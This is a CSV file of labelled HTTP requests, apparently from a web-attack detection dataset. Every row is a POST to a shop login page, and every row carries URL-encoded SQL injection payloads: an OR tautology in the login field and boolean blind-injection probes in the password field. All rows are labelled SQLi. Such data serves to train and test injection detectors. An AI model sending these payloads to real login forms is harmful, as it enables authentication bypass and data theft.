,id,method,path,query,label
0,0,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
1,1,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
2,2,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=3416&remember=&modo=entrar,SQLi
3,3,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=3305&remember=&modo=entrar,SQLi
4,4,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%28%29%29%27%29%29%29%22%29%29&remember=&modo=entrar,SQLi
5,5,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%29%20AND%202323%3D5295&remember=&modo=entrar,SQLi
6,6,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%29%20AND%203673%3D3673&remember=&modo=entrar,SQLi
7,7,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%29%20AND%201512%3D8534&remember=&modo=entrar,SQLi
8,8,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%29%20AND%203673%3D3673&remember=&modo=entrar,SQLi
9,9,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20AND%205619%3D6620&remember=&modo=entrar,SQLi
10,10,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20AND%203673%3D3673&remember=&modo=entrar,SQLi
11,11,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%22%20AND%201861%3D7325&remember=&modo=entrar,SQLi
12,12,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%22%20AND%203673%3D3673&remember=&modo=entrar,SQLi
13,13,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%29%20AND%202094%3D8197%20AND%20%287353%3D7353&remember=&modo=entrar,SQLi
14,14,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%29%20AND%203673%3D3673%20AND%20%285591%3D5591&remember=&modo=entrar,SQLi
15,15,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%29%29%20AND%203821%3D6259%20AND%20%28%283957%3D3957&remember=&modo=entrar,SQLi
16,16,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%29%29%20AND%203673%3D3673%20AND%20%28%286542%3D6542&remember=&modo=entrar,SQLi
